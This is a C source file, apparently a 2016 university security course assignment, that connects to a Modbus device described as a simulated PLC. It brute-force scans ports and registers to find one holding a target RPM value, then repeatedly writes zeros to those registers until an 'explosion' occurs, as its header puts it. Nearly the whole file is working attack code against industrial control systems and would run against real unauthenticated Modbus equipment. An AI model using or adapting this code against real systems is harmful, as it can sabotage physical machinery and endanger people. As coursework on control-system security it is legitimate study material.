/**********************************************************************
!*
!* 2016 Evan Dye  All Rights Reserved.
!*
!**********************************************************************
!*
!* Author       : Evan Dye
!* Institution  : University of New Mexico
!* Course       : CS-544
!* Semester     : Spring 2016
!*
!*********************************************************************
!******************************************************************************
! Purpose:   To connect to simulated plc and modify RPM register until "expolosion"
!
!*******************************************************************************/

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <modbus.h>

#include "options.h"


int naivePortScan(const int startingPort, const char *ipAddress, const int checkRegister)
{
	const int sleepDelay = 10000000; //Time in milliseconds
	int i, j; //Used for looping
	int port = -1; //return value
	int err; //Used for checking of modbus calls
	bool badPort;
	modbus_t *modbusConnection;
	uint16_t register_values[1]; //register


	for(i = startingPort; i < 65536; ++i)
	{
		modbusConnection = modbus_new_tcp(ipAddress, i);
		if(modbus_connect(modbusConnection) == -1)
		{
			modbus_free(modbusConnection);
		}
		else
		{
			//Verify that the ip/port pair is likely modbus
			err = modbus_read_registers(modbusConnection, checkRegister, 1, register_values);
			if(err == -1)
			{
				modbus_close(modbusConnection);
				modbus_free(modbusConnection);
			}
			else
			{
				port = i;
				break; //We've found a likely port
			}
		}
	}

	return port;
}

int registerScan(modbus_t *modbusConnection, const int targetRPM, const int tolerence, const int startingRegister)
{
	//Auto register finding
	int registerAddress = -1;
	int i = startingRegister;
	int err = 0;
	uint16_t register_values[1];

	while(err != -1)
	{
		err = modbus_read_registers(modbusConnection, i, 1, register_values);

		if(abs(register_values[0] - targetRPM) <= tolerence && err != -1)
		{
			registerAddress = i;
			break;
		}
		++i;
	}

	return registerAddress;
}


int main(int argc, char **argv)
{
	int i, j; //used for looping

	int err; //Used for modbus error checking
	options_t options;
	modbus_t *modbusConnection;
	uint16_t register_values[1];
	//just for auto scanning
	int numRegisters = -1;
	int registersToWrite[128]; //Used for writting to many registers
	for(i = 0; i < 128; ++i)
	{
		registersToWrite[i] = -1;
	}

	get_options(argc, argv, &options);
	print_options(&options);

	if(options.port == 0 && options.registerAddress == -1) //Auto port and auto register
	{
		fprintf(stdout, "Scanning ports and registers...\n");
		while(numRegisters < 1)
		{
			options.port = naivePortScan(options.port+1, options.ipAddress, 0);
			if(options.port == -1)
			{
				fprintf(stderr, "No modbus ports found at %s with registers containing %d +- %d\n", options.ipAddress, options.targetRPM, options. tolerence);
				return -1;
			}
			else
			{
				modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
				if(modbus_connect(modbusConnection) == -1)
				{
					modbus_free(modbusConnection);
					continue; //False positive so find a new port to try
				}

				for(i = 0; i < 128; ++i)
				{
					registersToWrite[i] = registerScan(modbusConnection, options.targetRPM, options.tolerence, registersToWrite[(i-1)+128 % 128]+1);
					if(registersToWrite[i] == -1)
					{
						numRegisters = i;
						break; // break out of for loop
					}
				}
				if(numRegisters < 1)
				{
					modbus_close(modbusConnection);
					modbus_free(modbusConnection);
				}
			}
		}
		fprintf(stdout, "Register, port pair found.\n");
	}
	else if(options.port == 0) //Auto port but not auto register
	{
		fprintf(stdout, "Scanning ports for modbus...\n");
		while(true)
		{
			options.port = naivePortScan(options.port+1, options.ipAddress, options.registerAddress);
			if(options.port == -1)
			{
				fprintf(stderr, "No modbus ports found at %s with register %d\n", options.ipAddress, options.registerAddress);
				return -1;
			}

			modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
			if(modbus_connect(modbusConnection) == -1)
			{
				modbus_free(modbusConnection);
			}
			else
			{
				break;
			}
		}
		fprintf(stdout, "Modbus port found.\n");
	}
	else if(options.registerAddress == -1) //Auto register but not auto port
	{
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
		if(modbus_connect(modbusConnection) == -1)
		{
			fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
			modbus_free(modbusConnection);
			return -1;
		}

		fprintf(stdout, "Scanning registers for target RPM value...\n");
		//Now actually scan the registers
		for(i = 0; i < 128; ++i)
		{
			registersToWrite[i] = registerScan(modbusConnection, options.targetRPM, options.tolerence, registersToWrite[(i-1)+128 % 128]+1);
			if(registersToWrite[i] == -1)
			{
				numRegisters = i;
				break; // break out of for loop
			}
		}
		if(numRegisters < 1) //make sure somethine was actually found
		{
			fprintf(stderr, "No registers found within expected range at %s:%d\n", options.ipAddress, options.port);
			modbus_close(modbusConnection);
			modbus_free(modbusConnection);
			return -1;
		}
		fprintf(stdout, "Register containing value within tolerence of target RPM found.\n");
	}
	else
	{
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
		if(modbus_connect(modbusConnection) == -1)
		{
			fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
			modbus_free(modbusConnection);
			return -1;
		}
		//Check the register is valid
		err = modbus_read_registers(modbusConnection, options.registerAddress, 1, register_values);
		if (err == -1)
		{
			print_options(&options);
			fprintf(stderr, "Reading register failed: %s\n", modbus_strerror(errno));
			modbus_close(modbusConnection);
			modbus_free(modbusConnection);
			return -1;
		}
	}

	if(options.registerAddress != -1)
	{
		err = 0;
		i = 0;
		fprintf(stdout, "Starting to write zeros to register %d at %s:%d\n", options.registerAddress, options.ipAddress, options.port);

		while(err != -1) //Doing it this way for now, will come up with better solution at a later time
		{
			err = modbus_write_register(modbusConnection, options.registerAddress, 0);
			++i;
		}

		fprintf(stderr, "Writing to register failed on iteration %d: %s\n", i, modbus_strerror(errno));
	}
	else
	{
		bool breakLoop = false;
		i = 0;
		fprintf(stdout, "Starting to write zeros to %d register(s) at %s:%d\n", numRegisters, options.ipAddress, options.port);
		while(!breakLoop)
		{
			breakLoop = true;
			for(j = 0; j < numRegisters; ++j)
			{
				if(registersToWrite[j] != -1)
				{
					err = modbus_write_register(modbusConnection, registersToWrite[j], 0);
					if(err == -1)
					{
						registersToWrite[j] = -1;
					}
					else
					{
						breakLoop = false;
					}
				}
			}
			++i;
		}
		fprintf(stderr, "Writing to register(s) failed on iteration %d: %s\n", i, modbus_strerror(errno));
	}

	fprintf(stdout, "Shutting down...\n");

	modbus_close(modbusConnection);
	modbus_free(modbusConnection);
	return 0;
}

